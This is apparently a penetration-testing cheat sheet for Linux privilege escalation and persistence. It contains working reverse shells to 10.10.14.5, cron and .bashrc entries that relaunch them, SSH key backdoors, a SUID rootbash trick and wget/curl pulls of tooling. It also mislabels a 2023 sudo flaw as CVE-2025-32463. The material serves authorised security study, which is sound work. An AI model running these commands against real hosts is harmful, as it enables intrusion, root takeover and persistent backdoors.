CPTS · Linux quick ops

Linux.

A grab-bag reference for working a Linux foothold: enumerate the host and your own context, hunt the usual local privilege-escalation paths (SUID/SGID, sudo rules, capabilities, cron, PATH), establish persistence, and keep the handy one-liners close. Open any node for what it means and the commands behind it. Everything here is for systems you are authorised to test: enumeration is quiet, but privilege escalation and persistence change the host and are logged, so stay inside scope and keep notes.

Full command reference on the CPTS page

Linux quick ops, mapped

  1. 01

    Local enumeration

    Learn who you are, what you can run, and what the host exposes before touching anything. All read-only, all as a standard user.

    • Your context (id / sudo -l)

      id prints your UID, GID and groups: membership of sudo, wheel, docker, lxd, adm or disk is a lead in itself (docker and lxd group members can trivially become root). sudo -l lists what you may run through sudo and as whom, the single most valuable privesc check, because a single misconfigured rule (NOPASSWD on an abusable binary) is often the whole path. hostnamectl and uname -a give the kernel and distro.

      id
whoami
sudo -l
uname -a
hostnamectl
cat /etc/os-release
    • Users & home dirs

      /etc/passwd lists every account, its shell and home directory; a world-readable /etc/shadow is an instant win (crack the hashes). Comb the home directories and /tmp, /var and web roots for keys, config and history files. The dot-files (.bash_history, .ssh, .aws, .config) are where credentials hide.

      cat /etc/passwd
ls -la /etc/shadow
ls -la /home/*
cat ~/.bash_history
find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null
    • Network (ss / ip)

      ss -tulpn (or netstat -tulpn) lists listening sockets with the owning process: services bound to 127.0.0.1 are reachable only from the host, prime pivot targets. ip a and ip route map the interfaces and routes; arp -a and /etc/hosts name neighbours. A service on localhost that runs as root is often the easiest escalation on the box.

      ss -tulpn
ip a
ip route
cat /etc/hosts
arp -a
    • Processes & software

      ps aux shows every process and its owner, revealing root-owned services and any credential passed on a command line. Note the installed package versions (dpkg -l / rpm -qa) and the service list for known-vulnerable software. pspy (no root needed) watches processes and cron jobs over time to catch short-lived root tasks you would otherwise miss.

      ps aux
ps auxf
dpkg -l 2>/dev/null | head
systemctl list-units --type=service --state=running
./pspy64
    • Scheduled jobs (cron)

      List your own crontab and read the system ones: /etc/crontab, /etc/cron.d and the cron.daily/hourly directories. A root cron job that runs a script you can write to, or uses a relative path or a wildcard, is a direct escalation. If you cannot read a job, pspy will show it executing.

      crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
    • Automated scanners

      linPEAS is the broad enumerator: it checks SUID/SGID, sudo, capabilities, cron, writable files, kernel version and known exploits, colour-coding the likely wins. LinEnum and linux-smart-enumeration (lse.sh) cover the same ground more quietly. Run one for breadth, then verify each flagged path by hand, the scanner suggests, you confirm.

      ./linpeas.sh
./LinEnum.sh
./lse.sh -l1

  2. 02

    Privilege escalation

    From a standard user to root. Walk the common paths in roughly decreasing order of reliability: sudo rules, SUID/SGID, capabilities, writable cron, PATH abuse, then a kernel exploit as a last resort.

    • Sudo rules + GTFOBins

      sudo -l is where most Linux escalations start. Any binary you may run as root through sudo is a candidate: look it up on GTFOBins for the 'sudo' escape that spawns a shell or reads a protected file. Even seemingly harmless tools (find, vim, less, awk, tar, env, python) have a documented escape. Watch for NOPASSWD entries and for env_keep settings (LD_PRELOAD / LD_LIBRARY_PATH with SETENV let you load a malicious library as root).

      sudo -l
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
      • Sudo version CVEs

        The sudo binary itself has had serious bugs: Baron Samedit (CVE-2021-3156), a heap overflow exploitable by any local user regardless of sudoers, and the 2023 chroot flaw (CVE-2025-32463 on recent versions). Check the version against known CVEs before assuming you need a sudoers rule at all.

        sudo --version | head -1
    • SUID / SGID binaries

      A SUID binary runs with the file owner's privileges (root), whoever executes it, so an abusable root-owned SUID is a shell. Find them with find and the -perm mask, then check each against GTFOBins for the 'SUID' entry. Custom or unusual SUID binaries are the most promising: a company-built helper rarely drops privileges correctly. SGID (-2000) is the group equivalent.

      find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
      • GTFOBins SUID escapes

        The common wins, each on GTFOBins: a SUID find runs find . -exec /bin/sh -p \; (the -p keeps the elevated privileges), a SUID bash needs bash -p, and nmap, vim, less, cp, env and dozens more have documented SUID escapes. The GTFOBins reference examples are in the table below. If a binary is not a known one, search its name plus 'SUID privilege escalation'.

        /usr/bin/find . -exec /bin/sh -p \; -quit
/path/to/suid/bash -p
    • Capabilities (getcap)

      Linux capabilities split root's power into units a binary can hold without being full SUID. getcap -r / lists every file with capabilities. cap_setuid+ep on an interpreter (python, perl, ruby) is as good as root: the program can set its UID to 0 itself. cap_dac_read_search reads any file; cap_dac_override writes any file. Check each capability against GTFOBins' 'Capabilities' entry.

      getcap -r / 2>/dev/null
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
    • Writable cron / scripts

      A root cron job that executes a script you can write to runs your code as root on its next tick. Find world-writable files and directories, cross-reference with the cron jobs, and look for jobs that call a script by a relative path or expand a wildcard (tar/rsync wildcard injection). Append a reverse shell or a chmod +s /bin/bash to the script and wait for the schedule.

      find / -writable -type f 2>/dev/null | grep -v '/proc/'
ls -la /etc/cron.d /etc/cron.daily
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable/cronscript.sh
    • PATH abuse

      When a root-run script or SUID binary calls another program by name instead of an absolute path (service, cat, ps), the shell resolves it through PATH. If you can prepend a directory you control to PATH, your malicious binary of that name runs as root. Classic against a SUID wrapper that shells out: create a fake 'service' in /tmp, put /tmp first in PATH, run the wrapper.

      echo $PATH
cd /tmp; echo '/bin/bash -p' > service; chmod +x service; export PATH=/tmp:$PATH
/path/to/suid-wrapper
    • Kernel & exploit suggesters

      If configuration yields nothing, the kernel version may. linux-exploit-suggester (les.sh) and linux-exploit-suggester-2 compare uname -a against a database of kernel CVEs and rank candidates (DirtyCow, DirtyPipe, OverlayFS, pwnkit). Kernel exploits can panic the host, so treat them as a last resort and prefer a stable, well-documented one on an authorised test.

      uname -a
./les.sh
./linux-exploit-suggester-2.pl
      • pwnkit / DirtyPipe

        Two near-universal local roots worth knowing: pwnkit (CVE-2021-4034) abuses pkexec's argument handling and hits almost every distro from 2009 onward; DirtyPipe (CVE-2022-0847) overwrites read-only files via a pipe-buffer flaw on kernels 5.8 to 5.16.11. Both have reliable public exploits; confirm the pkexec version and kernel before running.

        ls -la /usr/bin/pkexec
uname -r

  3. 03

    Persistence

    Survive a reboot or a dropped session. On an authorised test, record every mechanism you add so it can be removed in the clean-up.

    • SSH authorized_keys

      The quietest foothold: append your public key to a user's ~/.ssh/authorized_keys and you can log in as them over SSH with no password, as long as the key stays. Root's authorized_keys gives passwordless root. Needs write access to the target user's .ssh (you already have it for your own user). Remove the line during clean-up.

      mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
    • Cron job

      A cron entry re-launches a reverse shell on a schedule. A user crontab (crontab -e) needs no root and fires as that user; a line in /etc/cron.d or a root crontab fires as root. Keep the interval modest and the command plausible. List and remove with the same tool.

      (crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"') | crontab -
crontab -l
    • systemd unit / timer

      A systemd service that restarts on failure, or a timer, is durable persistence. A unit in /etc/systemd/system runs as root (needs root to write); a user unit under ~/.config/systemd/user runs as you with lingering enabled. Enable it so it starts at boot. More robust than cron but more visible to an admin reviewing units.

      systemctl list-unit-files --type=service
systemctl enable --now evil.service
systemctl --user enable --now evil.service
    • Shell startup files

      A line in ~/.bashrc, ~/.profile or /etc/profile.d/ runs every time that user opens a shell, no scheduler needed. Useful to re-trigger a payload on the next interactive login. Quiet, but only fires on login, so pair it with another mechanism. Record the exact line you added.

      echo 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1" &' >> ~/.bashrc
ls -la /etc/profile.d/
  4. 04

    Handy one-liners

    The commands you reach for again and again: spawning a proper shell, transferring files, and upgrading a dumb shell to an interactive one.

    • Upgrade to a TTY

      A raw reverse shell has no job control, no tab completion and dies on Ctrl-C. Upgrade it: spawn a PTY with Python, then background it and set the terminal to raw so you get a full interactive shell with history and arrow keys. The stty rows/cols step makes full-screen tools (vim, less) render correctly.

      python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
[Ctrl-Z] then: stty raw -echo; fg
stty rows 38 cols 116
    • Reverse shells

      When you have command execution and want a shell back. bash /dev/tcp is built in and needs nothing extra; nc with -e (or the mkfifo variant where -e is stripped) and a Python one-liner cover the rest. Start a listener (nc -lvnp 443) on your host first. The attacker IP here is a placeholder.

      bash -i >& /dev/tcp/10.10.14.5/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
    • File transfer

      Move tooling onto the box or loot off it. Serve a directory from your host with Python's HTTP server, then pull with wget or curl. scp works when you have SSH. For a quick paste, base64 the file and decode it on the far side. The host here is the attacker's HTTP server.

      python3 -m http.server 80
wget http://HOST/linpeas.sh -O /tmp/linpeas.sh
curl http://HOST/linpeas.sh -o /tmp/linpeas.sh
base64 -w0 file | xclip  # then: echo <b64> | base64 -d > file
    • Find interesting files

      Sweep the filesystem for the things that matter: world-writable files and directories, files owned by root that you can write, recently modified files, and credentials in config. Redirect stderr to /dev/null to cut the permission-denied noise.

      find / -writable -type d 2>/dev/null
find / -user root -perm -o+w -type f 2>/dev/null
find / -name '*.conf' -exec grep -l -i 'password' {} \; 2>/dev/null
grep -riE 'password|api_key|secret' /var/www 2>/dev/null

Linux capabilities worth hunting

What each capability grants when set on a binary via getcap. cap_setuid is the clearest win. Filter by capability.

CapabilityWhat it enables
cap_setuid+epThe binary can set its UID to 0: on an interpreter (python/perl), instant root
cap_setgid+epSet GID: escalate group membership
cap_dac_read_search+epBypass read permission checks: read any file, including /etc/shadow
cap_dac_override+epBypass all file permission checks: write any file
cap_sys_admin+epBroad admin operations (mount, namespaces); many abuse paths
